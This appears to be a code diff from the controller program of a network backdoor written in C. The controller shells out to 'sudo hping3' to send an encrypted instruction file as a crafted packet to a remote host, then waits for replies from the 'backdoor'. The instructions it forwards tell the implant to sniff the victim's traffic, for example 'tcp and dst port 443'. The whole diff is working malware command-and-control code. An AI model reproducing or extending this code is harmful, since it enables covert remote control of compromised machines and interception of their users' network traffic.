@@ -35,24 +35,14 @@ int main(int argc, char *argv[]) {
 
     check_root_user();
     options_sniffer_init(&opts);
-    while(1) {
-        get_user_input(&opts);
-        if (confirm_user_input(&opts) == 1) break;
-    }
-    //TODO: encrypt user input
-    encrypt_and_create_instruction_file(&opts);
 
-    sprintf(hping3, "sudo hping3 -c 1 -2 -E ./instruction.txt -d 100 -p 53 %s", opts.sniff_ip);
-    system(hping3);
-//    send_instruction(&opts);
-
+    get_ip_address(&opts);   /* IP address for Hping */
     if ( (opts.sniffer_socket = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
         perror("socket creation failed");
         exit(EXIT_FAILURE);
     }
 
     memset(&sniffer_addr, 0, sizeof(sniffer_addr));
-
     sniffer_addr.sin_family    = AF_INET;
     sniffer_addr.sin_addr.s_addr = INADDR_ANY;
     sniffer_addr.sin_port = htons(DEFAULT_PORT);
@@ -62,12 +52,33 @@ int main(int argc, char *argv[]) {
 
     // Bind the socket with the server address
     if (bind(opts.sniffer_socket, (const struct sockaddr *)&sniffer_addr,
-              sizeof(sniffer_addr)) < 0 ) {
+             sizeof(sniffer_addr)) < 0 ) {
         perror("bind failed");
         exit(EXIT_FAILURE);
     }
-
     target_addr_len = sizeof(target_addr);
+
+    while(strstr(opts.sniff_instruction, "tcp") == NULL &&
+            strstr(opts.sniff_instruction, "udp") == NULL &&
+                strstr(opts.sniff_instruction, "port") == NULL) {
+        memset(opts.sniff_instruction, 0, sizeof(opts.sniff_instruction));
+        while(1) {
+            get_instruction(&opts);
+            if (confirm_user_input(&opts) == 1) break;
+        }
+        //TODO: encrypt user input
+        encrypt_and_create_instruction_file(&opts);
+
+        sprintf(hping3, "sudo hping3 -c 1 -2 -E ./instruction.txt -d 100 -p 53 %s", opts.sniff_ip);
+        system(hping3);
+
+        recvfrom(opts.sniffer_socket, buffer, sizeof(buffer), 0,
+                 (struct sockaddr *)&target_addr, &target_addr_len);
+        printf("%s", buffer);
+        memset(buffer, 0, sizeof(buffer));
+    }
+
+
     puts("Receiving from backdoor packet ...");
     while(1) {
         signal(SIGINT,sig_handler);
@@ -119,7 +130,9 @@ void get_instruction(struct options_sniffer *opts) {
     while(1) {
         printf("\n[ SNIFFING Instruction ]\n");
         printf("Type [ Instruction ] to forward the backdoor instruction\n");
-        printf("Ex) tcp and dst port 443 -c 30 (if '-c' not provided it will get 100 packets by default)\n");
+        printf("(if '-c' not provided it will get 100 packets by default)\n");
+        printf("Ex) tcp and dst port 443 -c 30\n");
+        printf("=> ");
         fflush(stdout);
 
         fgets(input, sizeof(input), stdin);
